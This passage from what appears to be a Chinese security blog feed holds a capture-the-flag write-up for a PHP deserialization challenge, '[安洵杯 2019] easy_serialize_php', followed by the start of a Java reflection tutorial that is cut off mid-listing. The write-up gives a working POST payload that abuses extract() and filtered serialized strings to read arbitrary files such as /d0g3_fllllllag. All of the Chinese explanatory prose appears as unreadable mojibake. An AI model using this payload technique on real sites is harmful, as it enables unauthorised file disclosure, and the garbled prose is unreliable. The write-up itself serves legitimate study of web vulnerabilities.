class="hljs-string">&quot;;&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>å‡å¦‚è¿™é‡Œæ·»åŠ ä¸€å±‚è¿‡æ»¤ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter_arr</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//è¿™å˜æˆäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼äº†å“¦</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$img</span>);<span class="hljs-comment">//çœ‹ä¸€ä¸‹imgé‡Œé¢æœ‰æ²¡æœ‰filterçš„ä¸œè¥¿ï¼Œæœ‰çš„è¯ï¼Œæ¢æˆç©ºæ ¼</span><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;phpflag&#x27;</span> =&gt; <span class="hljs-string">&#x27;;s:5:&quot;xsw6a&quot;;s:2:&quot;zx&quot;;s:1:&quot;1&quot;;&#125;&#x27;</span>,<br>    <span class="hljs-string">&#x27;cuit&#x27;</span> =&gt; <span class="hljs-string">&#x27;stop water and stop power college&#x27;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">filter</span>((<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>))));<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271432213.png" alt="QQæˆªå›¾20220227143230"></p><p>æ¸…æ¥šå¯è§è¿™é‡Œå¾—<code>phpflag</code>è¢«è¿‡æ»¤æ›¿æ¢ä¸ºç©ºã€‚è¿™é‡Œå®é™…çš„å¯¹åº”å€¼å¦‚ä¸‹ã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tap">s<span class="hljs-number"> 7 </span>;s:31: <span class="hljs-comment">#ç¬¬ä¸€ä¸ª</span><br>s<span class="hljs-number"> 5 </span>xsw6a  <span class="hljs-comment">#ç¬¬äºŒä¸ª</span><br>s<span class="hljs-number"> 2 </span>zx     <span class="hljs-comment">#ç¬¬ä¸‰ä¸ª</span><br>s<span class="hljs-number"> 1 </span>1      <span class="hljs-comment">#ç¬¬å››ä¸ª</span><br></code></pre></td></tr></table></figure><h3 id="å®‰æ´µæ¯-2019-easy-serialize-php"><a href="#å®‰æ´µæ¯-2019-easy-serialize-php" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_serialize_php"></a>[å®‰æ´µæ¯ 2019]easy_serialize_php</h3><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456805.png" alt="QQæˆªå›¾20220227143810"></h3><p>è¯»ä»£ç ã€‚<br>ä¾æ¬¡åˆ†æã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤è€Œå·²ã€‚</p><p><strong>è¡¥å……</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456400.png" alt="QQæˆªå›¾20220227144023"></p><p>å¦‚æœé”®ååŒ…å«æ•°å­—å¥½åƒè¿™é‡Œç»•ä¸è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>é”€æ¯sessionã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br></code></pre></td></tr></table></figure><p>é‡æ–°ä¼ å…¥å‚æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ç®€å•ç†è§£æ¥è¯´ï¼Œå°±æ˜¯å¯ä»¥ç›´æ¥è¦†ç›–ä¸Šé¢çš„sessionå€¼ã€‚æœ¬åœ°å®éªŒå¦‚ä¸‹ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br><br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271445397.png" alt="QQæˆªå›¾20220227144500"></p><p>è®°ä½è¿™ä¸€ç‚¹å¾ˆå…³é”®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨åˆ°ä¸Šé¢å°†çš„ï¼š<strong>PHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ—¶ä»¥<code>;</code>ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥<code>&#125;</code>ä½œä¸ºç»“å°¾ï¼ˆå­—ç¬¦ä¸²é™¤å¤–ï¼‰ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$serialize_info</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$_SESSION</span>));<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br>    <span class="hljs-variable">$userinfo</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$serialize_info</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¿›å…¥phpinfoçœ‹çœ‹ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456509.png" alt="QQæˆªå›¾20220227144911"></p><p>æ„é€ ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456115.png"></p><p>&#x2F;d0g3_fllllllagï¼ˆå°†å…¶base64ï¼‰æ³¨æ„è¦åŠ ä¸Š<code>/</code>,å¼„äº†æˆ‘åŠå¤©ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mbGxsbGxsYWc=&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202271456746.png" alt="QQæˆªå›¾20220227145447"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åˆç†è§£åå°„</title>
    <link href="/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/"/>
    <url>/2022/02/25/%E5%88%9D%E7%90%86%E8%A7%A3%E5%8F%8D%E5%B0%84/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆç†è§£åå°„"><a href="#åˆç†è§£åå°„" class="headerlink" title="åˆç†è§£åå°„"></a>åˆç†è§£åå°„</h1><h2 id="ç†è§£åå°„"><a href="#ç†è§£åå°„" class="headerlink" title="ç†è§£åå°„"></a>ç†è§£åå°„</h2><p>Javaä¸­çš„åå°„æœºåˆ¶æ˜¯æŒ‡<strong>åœ¨è¿è¡ŒçŠ¶æ€ä¸­</strong>ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼›å¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼›è¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½æˆä¸ºJavaè¯­è¨€çš„åå°„æœºåˆ¶ã€‚</p><p>è¿™é‡Œçš„å¯ä»¥åœ¨è¿è¡ŒçŠ¶æ€ä¸­è·å–ä¿®æ”¹å€¼å¾ˆæ£’ã€‚ä»¥åçš„ccé“¾å°±è¦ç”¨åˆ°ã€‚</p><h2 id="è·å–Classå¯¹è±¡"><a href="#è·å–Classå¯¹è±¡" class="headerlink" title="è·å–Classå¯¹è±¡"></a>è·å–Classå¯¹è±¡</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Class.forName(&quot;å…¨ç±»å&quot;) è¯¥è¿‡ç¨‹å¤„äºå­—èŠ‚ç é˜¶æ®µ</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ç±»å.classå±æ€§ è¯¥è¿‡ç¨‹å¤„äºå†…å­˜é˜¶æ®µ</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å¯¹è±¡.getClass()æ–¹æ³• è¯¥è¿‡ç¨‹å¤„äºè¿è¡Œé˜¶æ®µ</span><br><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h2 id="ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ"><a href="#ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ" class="headerlink" title="ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ"></a>ç±»å¯¹è±¡ä¸­æœ‰ä»€ä¹ˆï¼Ÿ</h2><ul><li>æˆå‘˜å˜é‡ï¼ˆFieldå¯¹è±¡ï¼ŒField[] fieldsï¼‰</li><li>æ„é€ æ–¹æ³•   (Constructorå¯¹è±¡ï¼ŒConstructor[] cons)</li><li>æˆå‘˜æ–¹æ³•  (Methodå¯¹è±¡ï¼ŒMethod[] methods)</li></ul><h2 id="ä¸‰ç§é˜¶æ®µ"><a href="#ä¸‰ç§é˜¶æ®µ" class="headerlink" title="ä¸‰ç§é˜¶æ®µ"></a>ä¸‰ç§é˜¶æ®µ</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252218849.png" alt="image-20200411205831842"></p><h3 id="sourceæºä»£ç é˜¶æ®µ"><a href="#sourceæºä»£ç é˜¶æ®µ" class="headerlink" title="sourceæºä»£ç é˜¶æ®µ"></a>sourceæºä»£ç é˜¶æ®µ</h3><p>æ­¤æ—¶åˆšåˆšç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œä»ç„¶ä¿å­˜åœ¨ç¡¬ç›˜ä¸Šã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;xsw6a.Person&quot;</span>);<br>System.out.println(cls1);<br></code></pre></td></tr></table></figure><h3 id="Classç±»å¯¹è±¡é˜¶æ®µ"><a href="#Classç±»å¯¹è±¡é˜¶æ®µ" class="headerlink" title="Classç±»å¯¹è±¡é˜¶æ®µ"></a>Classç±»å¯¹è±¡é˜¶æ®µ</h3><p>ç±»åŠ è½½å™¨æŠŠPerson.classå­—èŠ‚ç åŠ è½½è¿›å†…å­˜ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">cls2</span> <span class="hljs-operator">=</span> Person.class;<br>System.out.println(cls2);<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œæ—¶é˜¶æ®µ"><a href="#è¿è¡Œæ—¶é˜¶æ®µ" class="headerlink" title="è¿è¡Œæ—¶é˜¶æ®µ"></a>è¿è¡Œæ—¶é˜¶æ®µ</h3><p>è¿™ä¸ªæ—¶å€™ç±»å¯¹è±¡å·²ç»å®ä¾‹åŒ–æˆä¸ºäº†ä¸€ä¸ªå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br><span class="hljs-type">Class</span> <span class="hljs-variable">cls3</span> <span class="hljs-operator">=</span> p.getClass();<br>System.out.println(cls3);<br></code></pre></td></tr></table></figure><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><ul><li>ä½¿ç”¨Class.forName()ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡ï¼ŒClass.forName() æ–¹æ³• å½“ç±»åŠ è½½è¿›äº†å†…å­˜ï¼Œåªæœ‰<strong>é™æ€åˆå§‹å—</strong>å¾—åˆ°äº†æ‰§è¡Œã€‚getDeclaredxxx ä¸èƒ½è·å–çˆ¶ç±»çš„æ–¹æ³•ã€‚</li><li>ä½¿ç”¨ç±»å.classæ¥åˆ›å»ºClasså¯¹è±¡çš„å¼•ç”¨æ—¶ï¼Œä¸ä¼šè‡ªåŠ¨åˆå§‹åŒ–è¯¥Classå¯¹è±¡</li><li>Class.forName() å±äºåŠ¨æ€åŠ è½½ç±»ã€‚å°†å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜ï¼Œå‚æ•°éœ€è¦ç±»çš„å…¨é™å®šå</li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="Personç±»"><a href="#Personç±»" class="headerlink" title="Personç±»"></a>Personç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒé¥­&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰“ç¯®çƒ&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="åå°„è·å–"><a href="#åå°„è·å–" class="headerlink" title="åå°„è·å–"></a>åå°„è·å–</h3><h4 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><ul><li>Fields[] getFields()ï¼šåªèƒ½è·å–æ‰€æœ‰publicä¿®é¥°çš„æˆå‘˜å˜é‡</li><li>Fields getField(String name)ï¼šè·å–ç‰¹å®šæˆå‘˜å˜é‡</li><li>Fields[] getDeclaredFields()ï¼šè·å–æ‰€æœ‰çš„æˆå‘˜å˜é‡ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦ï¼Œä¸è€ƒè™‘ç»§æ‰¿</li><li>Fields getDeclaredField(String name)ï¼šè·å–ç‰¹å®šçš„æˆå‘˜å˜é‡ï¼Œã€ä¸è€ƒè™‘ã€‘ä¿®é¥°ç¬¦ï¼Œä¸è€ƒè™‘ç»§æ‰¿</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] fields = personClass.getFields();<br>        <span class="hljs-keyword">for</span>(Field field : fields)&#123;<br>            System.out.println(field);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œåªä¼šè·å–publicå±æ€§çš„æˆå‘˜å˜é‡ã€‚ï¼ˆä¸ä¼šæœ‰ä»»ä½•å›æ˜¾ï¼Œè¯¥æ–¹æ³•ä¸ä¼šç›´æ¥è·å–æ‰€æœ‰æˆå‘˜å˜é‡ï¼‰ã€‚</p><p>æƒ³è¦è·å–æ‰€æœ‰æˆå‘˜å˜é‡å¦‚ä¸‹(æœ‰å›æ˜¾)ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemogetDeclaredFields</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">personClass</span> <span class="hljs-operator">=</span> Person.class;<br>        Field[] declaredFields = personClass.getDeclaredFields();<br>        <span class="hljs-keyword">for</span>(Field declaredField : declaredFields)&#123;<br>            System.out.println(declaredField);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202202252130870.png" alt="QQæˆªå›¾20220225212503"></p><p>ç»™Personç±»èµ‹å€¼ï¼ˆè¿™é‡Œé‡‡ç”¨çš„æ˜¯<code>getField</code>,åªèƒ½é‡‡ç”¨é‡æ–°è®¾ç½®publicå±æ€§èµ‹å€¼ï¼‰<br>ä¿®æ”¹<code>person</code>ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 